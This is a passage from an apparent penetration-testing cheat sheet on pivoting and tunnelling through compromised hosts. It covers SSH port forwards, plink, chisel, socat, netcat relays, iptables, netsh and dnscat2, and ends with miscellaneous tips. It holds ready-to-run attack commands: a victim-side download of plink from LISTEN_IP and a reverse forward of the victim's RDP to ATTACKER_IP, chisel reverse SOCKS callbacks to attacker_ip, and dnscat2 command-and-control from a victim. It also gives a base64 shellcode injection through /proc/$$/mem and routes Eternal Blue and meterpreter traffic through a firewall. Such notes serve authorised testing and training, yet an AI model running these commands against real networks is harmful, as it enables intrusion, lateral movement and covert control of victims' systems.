# In order to leverage -R remote port forwards, set the following:
GatewayPorts clientspecified

# Allow TCP forwarding (local and remote)
AllowTcpForwarding yes
```

After making changes to the `sshd_config` file you must restart `sshd` for changes to take effect.

```bash
# all commands executed as ROOT

# View the SSH server status.
systemctl status ssh

# Restart the SSH server (Debian, Ubuntu, Mint)
/etc/init.d/ssh restart # older SysV systems
service ssh restart # if service cmd installed
systemctl restart ssh # newer systemd systems

# for RHEL, Fedora, CentOS, Alma, Rocky, do...
/etc/init.d/sshd restart # older SysV systems
service sshd restart # if service command installed
systemctl restart sshd # newer systems w/ systemd

# FreeBSD, OpenBSD restart
/etc/rc.d/sshd restart
service sshd restart

# more at: https://www.cyberciti.biz/faq/howto-restart-ssh/

# Stop the SSH server.
systemctl stop ssh

# Start the SSH server.
systemctl start ssh
```

Here are common tunneling commands (using `-g` flag forces the ssh option
`GatewayPorts` to yes, and is good practice when using `-R`):

```sh
## Local Forwarding ###################################
# SSH local port forward from DMZ box to reach internal_server_ip:port via jumpbox_ip
ssh jumper@jumpbox_ip -p 2222 -L 0.0.0.0:4445:internal_server_ip:445
# Now `smbclient //DMZ_IP -p 4445 -N -L` on kali will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip

# SSH local port forward to send traffic from our local port 8080 to victim's
# port 80 (to get around firewall restrictions that don't allow remote
# connections to that port, but allow us to ssh in)
ssh victim@$VICTIM_IP -L 8080:localhost:80
# Now `curl localhost:8080` will fetch $VICTIM_IP:80 which is not reachable
# from the outside


## Remote Forwarding #################################
# forward traffic to redirector's port 80 to your local listener on port 8080
ssh jumper@jumpbox_ip -gR 0.0.0.0:80:localhost:8080
# now reverse shells pointed to the jumpbox_ip:80 will hit your local listener

# Connecting from jumpbox->attacker to give attacker access to
# internal_server_ip:445
ssh attacker@attacker_ip -gR 4445:internal_server_ip:445
# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip, getting around
# firewall rules that also prevent inbound ssh connections


## Complex example: Throwing Eternal Blue through firewall ##################################
# Local forward to victim's SMB & WinRPC ports, remote forward meterpreter callback to attacker
ssh jumper@jumpbox_ip -L 4450:victim_ip:445 -L 135:victim_ip:135 \
-R 4444:localhost:4444
# The -L 135:victim_ip:135 port forward is optional. If you do not want to use it, you will have to set VerifyArch to false in metasploit.


## Dynamic forwarding (SOCKS4/5) #######################
# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip, which is only reachable from jumpbox
ssh jumper@jumpbox_ip -p 2222 -D 1080
# Next config /etc/proxychains4.conf: socks5 localhost 1080
# Then: proxychains curl http://any_internal_server_ip/
# curl, nmap, wfuzz and some versions of netcat natively support SOCKS proxies.
# Look at their help to see how to use the feature.
# e.g.
curl -x socks5://127.0.0.1:1080 http://www.lolcats.com
# You can also set up firefox to browse through SOCKS proxy through GUI settings


## Remote Dynamic forwarding (SOCKS4/5) ################################
# Connecting from jumpbox -> attacker, open SOCKS proxy on
# attacker that forwards traffic to internal net. Useful
# when firewall blocking inbound traffic, but allows ssh out.
# OpenSSH _client_ needs to be version 7.6 or above to use.
ssh -R 1080 attacker@attacker_ip


## ProxyJump ########################################
# ProxyJump lets you nest ssh connections to reach remote internal networks/hosts
# Here we chain ssh connections like so: jumpbox1_ip -> jumpbox2_ip -> internal_host,
# where internal_host is only reachable from jumbpox2, and jumpbox2 is only reachable from jumpbox1
ssh -J jumper@jumpbox1_ip:2221,jumper2@jumbox2_ip:2222 remoteuser@internal_host

# Combine ProxyJump + dynamic port forward to create a proxy through 2nd_box which is only accessible via jumpbox_ip
ssh -J jumper@jumpbox1_ip proxyuser@2nd_box -D 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only


## Miscellaneous ###################################
# bypass first time prompt when have non-interactive shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...

# only allow a specific ssh key ability to port forward through port 6969:
# add following to ~/.ssh/authorized_keys
echo "from=\"$from_addr\",command=\"/usr/sbin/false\",no-agent-forwarding,no-X11-forwarding,no-pty,permitopen=\"localhost:6969\" $pubkey" >> ~/.ssh/authorized_keys
# where $from_addr is the IP that will be connecting to kali, and $pubkey is
# the full text of the id_rsa.pub file that you are using for this purpose.
```

When repeatedly using the same ProxyJump, it is easier to use if you set up `ssh_config` appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464) for more details. Summary of how to do it:

```
Host jumpbox1
    HostName 10.1.1.100
    Port 22
    User jumper1
    IdentityFile /home/user/.ssh/id_rsa_jump1
Host jumpbox2
    HostName 10.2.2.100
    Port 22
    User jumper2
    IdentityFile /home/user/.ssh/id_rsa_jump2
    ProxyJump jumpbox1
Host jumpbox3
    HostName 10.3.3.100
    Port 22
    User jumper3
    IdentityFile /home/user/.ssh/id_rsa_jump3
    ProxyJump jumpbox2
Host target
    HostName 10.4.4.100
    Port 22
    User target
    IdentityFile /home/user/.ssh/id_rsa_target
    ProxyJump jumpbox3
    RemoteForward 8080 127.0.0.1:8080  # open remote port 8080 and redirect all the way back to attacker machine
    LocalForward 3306 127.0.0.1:3306  # open attacker-local port 3306 that forwards to target's internal port 3306
    DynamicForward 1080  # open SOCKS proxy on attacker that tunnels all the way through target as exit node
```

You can also set up OpenSSH (v4.3+) to act as a full VPN to tunnel traffic. See
[here](https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling) for how to do it. (`-w` command flag, or `Tunnel` ssh_config option).

**PRO TIP**: If setting up a remote ssh tunnel purely to (remote-)forward traffic, use the following flags: `-gfNTR`.

- `-f` forks the ssh process into the background after
connection is established so you can keep using your terminal.
- `-N` and `-T` say "No" commands can be executed and no "TTY" is allocated.
  Using these together prevents command execution on the remote host (jump box)
- `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding


### 8.1.1 Ad Hoc SSH Port Forwards

TL;DR:

```
<ENTER><ENTER>~C
help
```

`ssh` also has an open command line mode to add or delete **ad hoc port forwards**. This can be summoned by typing the `<shift> ~ c` key sequence (`~C`) after SSH-ing into a box. One nuance to note is that the `~C` is only recognized after a new line, so be sure to hit Enter a few times before typing in the key sequence. It likes to be called from a pure blinking command prompt that hasn’t been "dirtied" by, for example, typing something, then deleting it. So just be sure to hit Enter a few times before trying to drop into the SSH open command line mode.

The ssh prompt will change to `ssh>` when you enter ad hoc command line mode.

Typing `help` in ad hoc command line mode shows command syntax examples.

### 8.1.2 SSH on Windows

SSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the `%systemdrive%\Windows\System32\OpenSSH` folder. Use `ssh.exe` just like `ssh` on Linux.

```powershell
# check if SSH is on Windows
where.exe ssh

# check if version >= 7.6, so we can use Reverse Dynamic forwarding
ssh.exe -V
```

The other option is to copy **`plink.exe`** over to the Windows box.

> ⚠ **NOTE:** If you need a SOCKS proxy instead of just direct port forwarding, DON'T use plink! It doesn't support SOCKS. Use chisel instead!!!

```sh
# grab copy of plink and host on http for Windows victim
cp /usr/share/windows-resources/binaries/plink.exe .
python -m http.server 80

# on windows, download it
iwr http://LISTEN_IP/plink.exe -outfile C:\Windows\Temp\plink.exe

# use plink similar to ssh, with addition of '-l USER -pw PASSWD'
# Note: echo y accepts host key on non-interactive shells.
# This command opens up the victim's firewalled RDP to your kali box.
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l portfwd -pw herpderp -N -R 3389:127.0.0.1:3389 ATTACKER_IP
```


### 8.1.3 Creating restricted user for ssh port forwarding only

This is valuable for working with `plink.exe` on Windows, which requires entering your password in plaintext into the command line, which isn't ideal for security.

First create the restricted `portfwd` user on your Kali box:

```sh
# create restricted user
# change 'herpderp' to whatever password you desire
# keep space in front of command to avoid it getting saved in shell history
 sudo useradd -c "ssh port forwarding only" --no-create-home --home-dir "/nonexistent" --no-user-group --system --shell "/usr/sbin/nologin" --password "$(openssl passwd -6 herpderp)" portfwd

# removing the user:
sudo userdel portfwd
```

Then add the following to the bottom of your `/etc/ssh/sshd_config`:

```
Match User portfwd
   #AllowTcpForwarding yes
   #X11Forwarding no
   #PermitTunnel no
   #GatewayPorts no
   #PermitOpen localhost:6969
   AllowAgentForwarding no
   PermitTTY no
   ForceCommand /usr/sbin/false
```

Finally, you MUST include the `-N` flag (no commands) when connecting over ssh, so you don't get booted when `/usr/sbin/false` returns an error.


## 8.2 SOCKS Proxies and proxychains

`proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
what `ssh -D` and `chisel -D` give you).

Add a proxy configuration line at the bottom of `/etc/proxychains4.conf`. The config format is `socks5 PROXY_IP PORT`.

```sh
# make sure proxychains is confgured for SOCKS:
sudo sh -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'
# prefer socks5 because it supports UDP (DNS!)
# if your proxy doesn't support it, use socks4

# using proxychains: put your command after 'proxychains -q'
# '-q' is quiet, so you don't see stderr msgs for each connection
sudo proxychains -q nmap -v -sT -F --open -Pn $VICTIM_IP
sudo proxychains -q nmap -v -sU -F --open -Pn $VICTIM_IP


# to proxy DNS through the new SSH SOCKS tunnel, set the following line in
# /etc/proxychains4.conf:
proxy_dns
# and set the following env variable:
export PROXYRESOLVE_DNS=REMOTE_DNS_SVR

# to speed up scanning with nmap through proxychains, set the following in
# /etc/proxychains.conf:
tcp_read_time_out 1000
tcp_connect_time_out 500


# ssh doesn't seem to work through proxychains.
# to tunnel ssh through a SOCKS proxy:
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' victim@VICTIM_IP
```

> ⚠ **NOTE**: To scan TCP with nmap through a SOCKS proxy, only full-connection scans are possible! (nmap option flag `-sT`). It's also often necessary to tell nmap to assume the host is up (`-Pn`). Until nmap's `--proxy` flag is stable, use `proxychains nmap` instead.
> 
> By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the `tcp_read_time_out` and `tcp_connect_time_out` values in `/etc/proxychains4.conf` will force time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times. I used `tcp_read_time_out 1000` and `tcp_connect_time_out 500` successfully.


## 8.3 Bending with sshuttle

[Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently route all traffic to a target internal subnet easily.

```sh
# sshuttle is most useful when you combine it with a multihop
# configuration like so:
# kali -> jumpbox1 (socat listening on 2222) -> DMZ_net (10.1.1.0/24) -> jumpbox2 (ssh) -> internal_net (172.16.2.0/24)

# on kali, run:
# the CIDR IPs are the target subnets you want sshuttle to route
# through your tunnel transparently.
sshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24
```

## 8.4 Bending with socat

On the jump-box:

```sh
# basic port forwarding with socat listener
sudo socat -dd TCP-LISTEN:80,fork TCP:REMOTE_HOST_IP:80
# optionally, do same thing bound to specific interface IP
sudo socat -dd TCP-LISTEN:80,bind=10.0.0.2,fork TCP:REMOTE_HOST_IP:80

# UDP relay
socat -dd -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978

# IPv4 to IPv6 tunnel
sudo socat -dd TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'

# TCP to Unix Domain Socket
socat -dd TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo
# more secure version
socat -dd TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
```

General socat syntax

```
socat [options] <address> <address>
```

Where `<address>` is in the form `protocol:ip:port` or `filename` or `shell-cmd`

Other useful addresses:
 - `STDIN` (equivalently, `-`), `STDOUT`, and `STDIO` (both stdin and stdout)
 - `EXEC:cmdline` or `SYSTEM:shell-cmd`
 - `FILE:/path/to/file` - log output to file
 - `FILE:$(tty),rawer` - a raw terminal
 - `PTY,link=/tmp/mypty,rawer,wait-slave`
 - `UDP:host:port` and `UDP-LISTEN:port`
 - `TCP:host:port` and `TCP-LISTEN:port`
 - `OPENSSL:host:port` and `OPENSSL-LISTEN:host:port`
 - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
 - `PIPE` or `PIPE:filename`

## 8.5 Bending with netcat

Netcat combined lets you do traffic bending. It's a crude (but effective) tool.

```powershell
# WINDOWS pivot
# enter temporary directory to store relay.bat
cd %temp%
# create relay.bat to connect to victim service
echo nc $VICTIM_IP VICTIM_PORT > relay.bat
# Set up pivot listener (-L is persistent listener)
nc –L -p LISTEN_PORT –e relay.bat
```

```sh
# LINUX pivot
# requires named pipe to join sender & receiver
mkfifo /tmp/bp  # backpipe
nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
# 'tee' lets you inspect bytes on the wire
```

## 8.6 Bending with iptables

Iptables forwarding requires `root` privileges.

Here's how to do traffic shaping to redirect traffic on port 80 through a pivot
host to your desired remote host. Note, it's usually also good practice to
specify the interface for iptables rules with `-i eth0` or whatever.

```sh
# allow inbound traffic on tcp port 80
sudo iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
# NAT the traffic from server's port 80 to remote host port 80 (changing dest addr)
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTE_HOST_IP:80
# enable NAT'ing on outbound traffic (changing source addr)
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
# allow forwarding traffic through iptables
sudo iptables -I FORWARD -j ACCEPT
# default policy to allow forwarding
sudo iptables -P FORWARD ACCEPT
```

**NOTE**: to forward IP packets (when using `MASQUERADE` or `SNAT`), you must first enable it in the kernel via:

```sh
# Enable ip forwarding in kernel permanently (fwding req'd for MASQUERADE/SNAT)
sudo sysctl -w net.ipv4.ip_forward=1
# -- or temporarily until reboot --
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# or /proc/sys/net/ipv4/conf/IFNAME/forwarding

# make iptables rules persistent (optional)
sudo service iptables-persistent save
```



## 8.7 Bending with rinetd

Better suited for **long-term** redirections.

Once installed (`apt install -y rinetd`), you can easily specify rinetd forwarding rules by changing the config settings in `/etc/rinetd.conf`. `rinetd` acts as a persistently-running service that does redirection.

Redirection rules are in the following format:

```
bindaddress bindport connectaddress connectport
```

The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its configuration file without interrupting existing connections. Under Linux the process id is saved in the file `/var/run/rinetd.pid` to facilitate the `kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.

## 8.8 Bending with netsh on Windows

If you own a dual-homed internal Windows box that you want to pivot from, you
can set up port forwarding using the `netsh` utility.

**NOTE**: Requires Administrator privileges.

```powershell
# NOTE: before you start, make sure IP Helper service is running

# establish IPv4 port forwarding from windows external IP to internal host
netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_VICTIM_IP
# example opening mysql connections to the outside on port 33066
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33066 connectaddress=127.0.0.1 connectport=3306

# confirming your port forwarding rule was added:
netsh interface portproxy show all

# confirming your port is actually listening:
netstat -anp TCP | findstr "4445"

# you also need to open a firewall rule to allow your inbound traffic (4445 in example)
# note: if you want to restrict it to a specific interface IP, add "localip=EXT_WIN_IP"
netsh advfirewall firewall add rule name="derp" protocol=TCP dir=in action=allow localport=4445

# on kali, check port is "open", not "filtered"
sudo nmap -T4 -sS -Pn -n -p4445 WINDOWS_IP

# removing firewall hole:
netsh advfirewall firewall delete rule name="derp"
```

## 8.9 Bending with chisel

[Chisel](https://github.com/jpillora/chisel) lets you securely tunnel using HTTP as a transport, allowing you to get through Deep Packet Inspection (DPI) firewalls to forward ports or set up a SOCKS proxy.

> ⚠ **NOTE**: The chisel installed on Kali doesn't always play nice with other Linux hosts. Always download the client binary from the repo!

[Chisel Releases Page](https://github.com/jpillora/chisel/releases/latest)

The most common way to use it is as a Reverse SOCKS proxy (reference: [Reverse SOCKS guide](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)). Example of Reverse SOCKS proxy setup:

```bash
# on attack box
# start reverse socks proxy server on port 8080:
./chisel server -p 8000 --reverse

# grab windows chisel.exe binary from:
# https://github.com/jpillora/chisel/releases/latest/

# on jumpbox (Windows example), set up reverse SOCKS proxy
.\chisel-x64.exe client attacker_ip:8000 R:socks

# then use proxychains from attack box like normal

# to do reverse port forwarding so kali can reach internal address,
# add the following to the previous command:
R:2222:VICTIM_IP:22

# to tunnel ssh through a SOCKS proxy without proxychains:
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:8000 %h %p' victim@VICTIM_IP
```


## 8.10 Bending with `dnscat2`

[Dnscat2](https://github.com/iagox86/dnscat2) is a tool for securely tunneling traffic through DNS queries in order to perform C2 functions on a victim. It has a server and a client binary. You run the server on a DNS nameserver you own. You run the client on a victim. Once a client establishes a session with the server, you can use a command interface on the server (kinda like msfconsole) to interact with the client. This includes setting up port forwarding rules.

```sh
# on your DNS Nameserver, start the dnscat2 server:
dnscat2-server mydomain.com

# on your victim, start the dnscat2 client
./dnscat mydomain.com


# on your DNS Nameserver, in the dnscat2 command shell:
# list active sessions (windows)
dnscat2> windows
# interact with window/session 1
dnscat2> window -i 1
# get help, listing all commands
command (victim01) 1> ? # or 'help'
# get command help for 'listen' (sets up local fwd like ssh -L)
command (victim01) 1> listen --help
# start local port forwarding
command (victim01) 1> listen 0.0.0.0:4455 VICTIM_IP:445
# if you mess up and have to change the listening port,
# you have to kill the client and restart it.
# It's usually better to just pick a different listen port if you can.
# return to main command screen
command (victim01) 1> shutdown
# (after restarting victim client, you can retry your port forward)
# if you want to return to the top level command window
# without killing the client:
command (victim01) 1> suspend


# on kali:
# now you can use your newly forwarded port to reach inside the victim network:
smbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/
# connection will be very slow.
```




# 9 Miscellaneous

## 9.1 Port Knocking

```sh
# port knock on ports 24->23->22 with nmap
# "-r" forces ports to be hit in order
# may want to add "--max-parallelism 1"
nmap -Pn --host-timeout 201 --max-retries 0 -r -p24,23,22 $VICTIM_IP

# doing the same thing with netcat
# NOTE: netcat can only knock on sequential ports without using a for-loop
nc -z $VICTIM_IP 22-24
```

If you're able to read files on the victim, check out their `/etc/knockd.conf`

## 9.2 Convert text to Windows UTF-16 format on Linux

```sh
# useful for encoding a powershell command in base64
echo "some text" | iconv -t UTF-16LE
```

## 9.3 Extract UDP pcap packet payload data

Using scapy:

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def handler(packet):
    print(str(packet.payload.payload.payload))

pcap = sys.argv[1]
sniff(offline=pcap, prn=handler, filter="udp")
```

Using Tshark from the command line:

```bash
tshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload | tr -d '\n' | xxd -r -p
# -r = input file
# -w = output file
# -Y = wiresark display filter
# -T = set the output format. "fields" shows only the fileds you select with -e
# -e = chosen fields to display with '-T fields'
# xxd: cannot combine '-r -p' like '-rp'
```

## 9.4 Execute Shellcode from Bash

```sh
cd /proc/$$;exec 3>mem;echo "McBQaC8vc2hoL2JpbonjUFOJ4bALzYA=" | base64 -d | dd bs=1 seek=$(($((16#`cat maps | grep /bin/bash | cut -f1 -d- | head -n 1`)) + $((16#300e0))))>&3
```

Explained:

-  cd into `/proc/$$/` to write to the current PID
-  Create a file descriptor 3 and point it to mem so you an write to FD 3 in the proc’s memory.
-  Echo shellcode as base64 and decode it
-  Use `dd` to write to your memory starting at the output of seek
   -  The line reads out the maps file showing the memory map of the bash process, then it greps for `/bin/bash` to find where it is loaded in memory. It gets the address with cut and head then converts it from base16 to decimal. It adds that number to `0x300e0`
   -  `0x300e0` is the location of bash’s exit function in memory
   -  Net result: You overwrite bash’s exit function with the shellcode

## 9.5 Encryption

### 9.5.1 Create self-signed SSL/TLS certificate

```sh
# generate separate .key and .crt files
openssl req -newkey rsa:2048 -nodes -keyout mycert.key -x509 -days 365 -subj '/CN=example.com/O=Company Inc./C=UK' -out mycert.crt

# simpler method?
openssl req -new -x509 -nodes -out mycert.pem -keyout mycert.key -days 365

# convert .key/.cert to .pem file (easy way)
cat mycert.crt mycert.key > mycert.pem

# official way to convert combo of .key and .crt to .pem if needed:
openssl pkcs12 -export -in mycert.crt -inkey mycert.key -out mycert.p12
openssl pkcs12 -in mycert.p12 -nodes -out mycert.pem

# create client cert from ca.key
openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
```

### 9.5.2 Decrypting files with GPG

```sh
# import public and private keys into gpg
gpg --import secring.gpg pubring.gpg

# list imported pubkeys
gpg --list-keys

# list imported private keys
gpg --list-secret-keys

# decrypting file with keys already imported
gpg -d -o secret.txt secret.txt.gpg
```

## 9.6 Validating Checksums

This is how you validate a sha256 checksum for a file:

```sh
# make checksum check-file.
# Format is <hexdigest><space><filename>, in same directory as file.
echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb" > sha256sum_nessus

# run sha256sum with '-c <check-file>' to have it validate the checksums match
sha256sum -c sha256sum_nessus
```

## 9.7 Inspecting Files with Exiftool

We can examine the metadata of files with `exiftool`, which can reveal a lot of useful information. This information may be helpful for client-side attacks.

```sh
# -a shows duplicated tags
# -u shows unknown tags
exiftool -a -u FILENAME

# TIP: use gobuster to look for files
gobuster dir -ezqrkt100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x doc,docx,pdf,xls,xlsx,ppt,pptx,zip -u http://VICTIM_IP
# you can also use an extension wordlist with the (capital) `-X` flag:
# -X /usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt
```

Things to look for:

- file creation date
- last modified date
- author's name
- operating system
- application used to create the file

References:

- [List of tags recognized by `exiftool`](https://exiftool.org/TagNames/)
- [Exiftool download](https://exiftool.org) - shows list of supported files



